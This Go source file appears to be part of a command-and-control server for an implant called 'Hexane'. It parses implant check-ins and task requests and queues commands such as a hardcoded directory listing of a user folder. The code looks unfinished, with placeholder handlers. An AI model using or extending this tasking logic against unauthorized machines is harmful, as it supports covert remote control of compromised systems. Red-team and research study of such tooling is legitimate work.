package main

import (
	"fmt"
	"strings"
)

func (m *Message) DispatchCommand(h *HexaneConfig, s *Stream, UserInput string) {
	var (
		Buffer      []string
		Arguments   []string
		Command     string
		CommandType uint32
	)

	Buffer = strings.Split(UserInput, " ")
	Command = Buffer[0]

	Arguments = append(Arguments, Buffer[1:]...)
	Args := strings.Join(Arguments, " ")

	h.Implant.CurrentTaskId++
	for k, v := range CommandMap {
		if Command == "" {
			CommandType = CommandNoJob
			break
		}
		if strings.EqualFold(k, Command) {
			CommandType = v
		}
	}

	s.AddDword(CommandType)
	s.AddString(Args)
}

func (s *Stream) CreateHeader(Parser *Message, msgType uint32, taskId uint32) {

	s.AddDword(Parser.PeerId)
	s.AddDword(taskId)
	s.AddDword(msgType)
}

func (h *HexaneConfig) HandleCheckin(Parser *Message, Stream *Stream) {

	h.mu.Lock()
	defer h.mu.Unlock()

	if Parser.ParserPrintData(TypeCheckin) {
		Stream.CreateHeader(Parser, TypeCheckin, uint32(h.TaskCounter))

		if debug {
			WrapMessage("DBG", "outgoing response: ")
			PrintBytes(Stream.Buffer)
		}
	}

	WrapMessage("INF", fmt.Sprintf("%s checkin received from %s", Parser.Method, Parser.Address))
}

func (h *HexaneConfig) HandleCommand(Parser *Message, Stream *Stream) {

	h.mu.Lock()
	defer h.mu.Unlock()

	Stream.CreateHeader(Parser, TypeTasking, uint32(h.TaskCounter))
	Parser.DispatchCommand(h, Stream, "dir C:/Users/lemur") // user command interface

	if debug {
		WrapMessage("DBG", "outgoing response: ")
		PrintBytes(Stream.Buffer)
	}

	WrapMessage("DBG", fmt.Sprintf("task request: %d", Parser.PeerId))
}

func ParseMessage(body []byte) ([]byte, error) {
	var (
		err     error
		Parser  *Message
		implant *HexaneConfig
		stream  = new(Stream)
	)

	for body != nil {
		fmt.Println("message body: ")
		PrintBytes(body)

		Parser = CreateParser(body)

		Parser.PeerId = Parser.ParseDword()
		Parser.TaskId = Parser.ParseDword()
		Parser.MsgType = Parser.ParseDword()
		Length := Parser.ParseDword()

		fmt.Println("parsing buffer")

		if implant = GetConfigByPeerId(Parser.PeerId); implant != nil {

			WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", Parser.PeerId))
			implant.TaskCounter++

			switch Parser.MsgType {
			case TypeCheckin:
				{
					WrapMessage("DBG", "incoming message is a checkin")
					implant.HandleCheckin(Parser, stream)
					break
				}
			case TypeTasking:
				{
					WrapMessage("DBG", "incoming message is a task request")
					implant.HandleCommand(Parser, stream)
					break
				}
			case TypeResponse:
				{
					WrapMessage("DBG", "incoming message is a response with data")
					// print response
				}
			case TypeSegment:
				{
					WrapMessage("DBG", "incoming message is a segment with data")
					// this will loop and do nothing.
				}
			default:
				{
					WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", Parser.MsgType))
					stream.Buffer = []byte("200 ok")
					break
				}
			}
		} else {
			WrapMessage("ERR", "could not find peer in the database")
			stream.Buffer = []byte("ok")
		}

		if len(body) >= int(Length) {
			body = body[Length:]
		} else {
			body = nil
		}
	}

	return stream.Buffer, err
}
